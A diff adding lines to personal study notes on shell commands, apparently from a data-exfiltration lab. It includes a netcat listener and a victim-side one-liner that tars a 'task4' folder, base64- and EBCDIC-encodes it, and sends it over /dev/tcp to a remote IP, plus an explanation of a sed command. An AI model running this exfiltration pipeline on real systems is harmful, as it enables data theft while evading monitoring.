@@ -18,3 +18,35 @@ f: Specifies the archive file to operate on. In this case, - is used to read the
 So, the command tar xpf - means:
 
 Extract the tarball from standard input (-), while preserving permissions.
+
+
+
+Digital ocean own https server https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04
+
+
+
+
+In our machine nc -lvp 8080 > /tmp/task4-creds.data
+in victim tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
+
+
+
+
+
+
+
+sudo sed -i 's/ /+/g' /tmp/http.bs64
+breaks down as follows:
+
+sudo: Runs the command with superuser (root) privileges.
+sed -i: Runs the stream editor sed in-place, modifying the file directly.
+'s/ /+/g': The sed substitution command:
+s: Substitutes the first pattern (a space ) with the second pattern (a plus sign +).
+/g: Replaces all occurrences in each line (global replacement).
+/tmp/http.bs64: The target file being modified, in this case, /tmp/http.bs64.
+What it does:
+It replaces all spaces ( ) with plus signs (+) in the file /tmp/http.bs64. This could be useful for URL encoding, where spaces are often replaced with +.
+
+
+
+
